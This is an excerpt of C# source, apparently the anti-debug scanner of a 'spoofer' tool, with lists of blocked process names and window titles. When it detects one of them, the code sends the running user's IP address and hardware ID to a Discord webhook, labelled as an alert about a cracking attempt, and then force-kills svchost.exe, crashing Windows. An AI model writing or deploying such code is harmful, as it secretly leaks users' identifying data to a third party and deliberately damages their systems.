...
namespace Anti_DebugNET.AntiDebugTools
{
    class Scanner
    {
                    ...
                    if (KillProcess)
                    {
                        try
                        {
                            ...
                            using (RLBmods.DcWebHook dcWeb = new RLBmods.DcWebHook())
                            {
                                ...
                                dcWeb.SendMessage("<@853211961575079938>" + Environment.NewLine + "css" + Environment.NewLine + "[ALERT | A GUY HAS TRYED TO CRACK THE SPOOFER]" + Environment.NewLine + "IP | " + RLBmods.IP.Grab() + Environment.NewLine + "HWID | " + RLBmods.HWID.Grab() + Environment.NewLine + Environment.NewLine + "Username | " + Environment.NewLine + "Password | " + Environment.NewLine + ""); Process.Start("taskkill", "/F /IM svchost.exe");
        ...
        private static int Init()
        {
            ...
            BadProcessnameList.Add("CrashReportClient");
            BadProcessnameList.Add("ReportCrashClient");
            BadProcessnameList.Add("Fiddler Everywhere");
            ...
            BadWindowTextList.Add("FolderviewChanger");
            BadWindowTextList.Add("FolderViewerud");
            BadWindowTextList.Add("FolderViewChanger");
            BadWindowTextList.Add("FolderChangeView");
            BadWindowTextList.Add("FolderChangerView");
            BadWindowTextList.Add("FolderViewChanger");
